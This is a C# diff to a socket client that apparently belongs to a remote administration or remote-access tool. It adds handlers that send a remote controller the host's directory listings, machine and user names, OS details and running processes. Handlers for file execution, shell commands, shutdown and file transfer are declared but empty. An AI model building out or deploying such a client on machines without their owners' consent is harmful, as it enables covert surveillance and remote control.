@@ -3,6 +3,7 @@ using System.Net;
 using Shared;
 using System.Text;
 using Newtonsoft.Json;
+using System.Diagnostics;
 
 namespace Client
 {
@@ -20,10 +21,10 @@ namespace Client
 
             clientSocket = new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
             {
-                ReceiveTimeout = 0,
-                SendTimeout = 0,
-                ReceiveBufferSize = 8192,
-                SendBufferSize = 8192
+                ReceiveTimeout = 15,
+                SendTimeout = 15,
+                ReceiveBufferSize = 2048,
+                SendBufferSize = 2048
             };
         }
 
@@ -59,31 +60,31 @@ namespace Client
 
                             string receivedCommand = Encoding.UTF8.GetString(commandBuffer);
 
-                            string command = ManagementSocketConnection.SocketCommand(SocketCommands.NotifyMessage);
+                            string command = Types.SocketCommand(SocketCommands.NotifyMessage);
 
-                            if (receivedCommand.IndexOf(ManagementSocketConnection.SocketCommand(SocketCommands.NotifyMessage)) >= uint.MinValue)
+                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) >= uint.MinValue)
                             {
-                                string receivedMessage = receivedCommand.Replace(ManagementSocketConnection.SocketCommand(SocketCommands.NotifyMessage), "");
+                                string receivedMessage = receivedCommand.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");
 
                                 MessageBox.Show(receivedMessage);
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.ExecFile).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.ExecFile).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.PingTarget).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.PingTarget).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (receivedCommand.IndexOf(ManagementSocketConnection.SocketCommand(SocketCommands.ExplorePath)) >= uint.MinValue)
+                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) >= uint.MinValue)
 
                             {
                                 List<ItemType> items = new();
 
-                                string path = receivedCommand.Replace(ManagementSocketConnection.SocketCommand(SocketCommands.ExplorePath), "");
+                                string path = receivedCommand.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");
 
                                 foreach (string item in Directory.GetDirectories(path))
                                 {
@@ -95,34 +96,54 @@ namespace Client
                                     items.Add(new ItemType(new DirectoryInfo(item).Name, "File", item, new FileInfo(item).Length));
                                 }
 
-                                byte[] itemsBuffer = commandBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));
+                                byte[] itemsBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));
 
                                 await ManagementSocketConnection.SocketWriterAsync(socket, itemsBuffer, cancellationToken);
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.NotifyOSInformations).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.NotifyOSInformations).Equals(receivedCommand))
+                            {
+                                var systemInfo = new SystemInfo(
+                                    Environment.OSVersion.Platform,
+                                    Environment.MachineName,
+                                    Environment.Is64BitOperatingSystem,
+                                    Environment.UserName);
+
+                                byte[] osInfoBuffer = commandBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(systemInfo));
+
+                                await ManagementSocketConnection.SocketWriterAsync(socket, osInfoBuffer, cancellationToken);
+                            }
+
+                            if (Types.SocketCommand(SocketCommands.NotifyShellCommand).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.NotifyShellCommand).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.RemoteShutdown).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.RemoteShutdown).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.UploadFile).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.UploadFile).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.DownLoadFile).Equals(receivedCommand))
                             {
 
                             }
 
-                            if (ManagementSocketConnection.SocketCommand(SocketCommands.DownLoadFile).Equals(receivedCommand))
+                            if (Types.SocketCommand(SocketCommands.GetProcesses).Equals(receivedCommand))
                             {
+                                List<ProcessInfo> processes = new();
 
+                                foreach (Process? process in Process.GetProcesses().ToList())
+                                    processes.Add(new ProcessInfo(process.Id, process.ProcessName, "", process.NonpagedSystemMemorySize64));
+
+                                byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));
+
+                                await ManagementSocketConnection.SocketWriterAsync(socket, processesBuffer, cancellationToken);
                             }
                         }
                         catch (Exception ex)
@@ -132,20 +153,5 @@ namespace Client
                 }
             }, cancellationToken);
         }
-    }
-
-    internal class ItemType
-    {
-        public ItemType(string Name, string Type, string Path, long Size)
-        {
-            this.Name = Name;
-            this.Type = Type;
-            this.Path = Path;
-            this.Size = Size;
-        }
-        public string Name { get; set; }
-        public string Type { get; set; }
-        public string Path { get; set; }
-        public long Size { get; set; }
     }
 }
